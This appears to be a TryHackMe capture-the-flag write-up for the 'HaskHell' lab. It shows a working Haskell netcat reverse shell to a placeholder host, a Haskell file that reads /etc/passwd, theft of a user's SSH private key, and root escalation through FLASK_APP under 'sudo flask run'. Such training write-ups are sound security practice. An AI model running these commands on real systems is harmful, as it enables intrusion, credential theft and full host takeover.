# Tryhackme - HaskHell - WruteUp
![alt text](image.png)

## Description
This machine provides an excellent hands-on introduction to Haskell programming for security enthusiasts. It’s simple enough for beginners yet offers interesting challenges that deepen understanding. Working through the exercises builds practical skills and reinforces functional programming concepts. The experience is both educational and engaging, making it a worthwhile learning opportunity.
Overall, it’s a great way to combine security practice with solid Haskell fundamentals.
## Enumeartion
First of all we must attempt an Nmap scan to see the open ports of the target. Running nmap as root.
```php
nmap -sV -sC -T4 -vv -o nmapScan 10.10.104.103

# Nmap 7.94SVN scan initiated Fri Oct 31 06:02:46 2025 as: /usr/lib/nmap/nmap -sV -sC -T4 -vv -o nmapScan 10.10.104.103
Nmap scan report for 10.10.104.103
Host is up, received echo-reply ttl 63 (0.076s latency).
Scanned at 2025-10-31 06:02:47 EDT for 20s
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD6azVu3Hr+20SblWk0j7SeT8U3VySD4u18ChyDYyOoZiza2PTe1qsuwnw06/kboHaLejqPmnxkMDWgEeXoW0L11q2D8mfSf8EVvk++7bNqQ0mlkjdcknOs11mdYqSOkM1yw06LolltKtjlf/FpT706QFkRKQO30fT4YgKY6GD71aYdafhTBgZlXA51pGyruDUOP+lqhVPvLZJnI/oOTWkv5kT0a3T+FGRZfEi+GBrhvxP7R7n3QFRSBDPKSBRYLVdlSYXPD83P1pND6F/r3BvyfHw4UY0yKbw+ntvhiRcUI2FYyN5Vj1Jrb6ipCnp5+UcFdmROOHSgWS5Qzzx5fPZB
|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMx1lBsNtSWJvxM159Ahr110Jpf3M/dVqblDAoVXd8QSIEYIxEgeqTdbS4HaHPYnFyO1j8s6fQuUemJClGw3Bh8=
|   256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICPmznEBphODSYkIjIjOA+0dmQPxltUfnnCTjaYbc39R
5001/tcp open  http    syn-ack ttl 63 Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-title: Homepage
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 31 06:03:07 2025 -- 1 IP address (1 host up) scanned in 20.90 seconds
```

There are two ports open:
- 22 SSH
- 5001 http Gunicorn 19.7.1

## Directory Scanning
Accessing the http://target-ip:5001 on web we can see the following page.
![](image-1.png)

It's a welcome message for the Haskell programming language. Now we can fuzz the page using any directory scanning tool. I prefer the [dirsearch](https://github.com/maurosoria/dirsearch).

![alt text](image-2.png)

Dirsearch found the submit folder which is accessible and is an upload file functionality.
![alt text](image-3.png)

I try to upload a php revese shell file but nothing happened. But if we upload a .hs file it shows results. I create this file to access the /etc/passwd file.
```php
import System.IO

main = do
        handle <- openFile "/etc/passwd" ReadMode
        contents <- hGetContents handle
        putStr contents
        hClose handle
```
After I hit Upload i get this results.
![alt text](image-4.png)

Now it's time for the reverse shell part
## Reverse shell - User Flag
The reverse shell code can be found to [github](https://github.com/passthehashbrowns/Haskell-Reverse-Shell/blob/master/README.md) or to the [reverse shell generator](https://www.revshells.com/). I prefere the generator by choosing the Haskell#1
```php
module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc YOUR-IP YOUR-PORT >/tmp/f"
```

Save it with the extension .hs, start a netcat listener and upload it.
![alt text](image-5.png)

After the successful reverse shell connection the user flag located to the path: /home/prof/user.txt
```
find / -name "user.txt" 2>/dev/null
/home/prof/user.txt
```

## Prof User
In home direvtory there are three users.
```
flask  haskell  prof
```
We can see the prof's id_rsa key which is located to
```
/home/prof/.ssh/id_rsa
```

Copy it on your local machine, change the permissions to 600 by typing 
```
chmod 600 id_rsa
```
Now log in to prof user with the following ssh command:
```
ssh prof@<TARGET-IP> -i id_rsa
```
![alt text](image-6.png)

## Root Flag
After we logged in with prof user we can type sudo -l to see what can the prof user run with sudo.
```
sudo -l

Matching Defaults entries for prof on haskhell:
    env_reset, env_keep+=FLASK_APP, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prof may run the following commands on haskhell:
    (root) NOPASSWD: /usr/bin/flask run
```

We can use /usr/bin/flask run. By just typing /usr/bin/flask on the terminal we can see the help option appear on the screen
```
Usage: flask [OPTIONS] COMMAND [ARGS]...

  This shell command acts as general utility
  script for Flask applications.

  It loads the application configured (through
  the FLASK_APP environment variable) and then
  provides commands either provided by the
  application or Flask itself.

  The most useful commands are the "run" and
  "shell" command.

  Example usage:

    $ export FLASK_APP=hello.py
    $ export FLASK_DEBUG=1
    $ flask run

Options:
  --version  Show the flask version
  --help     Show this message and exit.

Commands:
  run    Runs a development server.
  shell  Runs a shell in the app context.
```

The flask run command starts a Flask development server; by default it loads a Python application from the FLASK_APP environment variable and executes that code as a Python module. Because you can run flask run as root, any application code Flask imports or runs will also execute with root privileges. We can exploit it by setting FLASK_APP to a Python script that spawns a root shell.

### Follow these steps
```php
prof@haskhell:~$ cd /tmp
prof@haskhell:/tmp$ echo 'import os; os.system("/bin/bash")' > shell.py
prof@haskhell:/tmp$ export FLASK_APP=/tmp/shell.py
prof@haskhell:/tmp$ sudo /usr/bin/flask run
```
Now we are Root
![alt text](image-7.png)
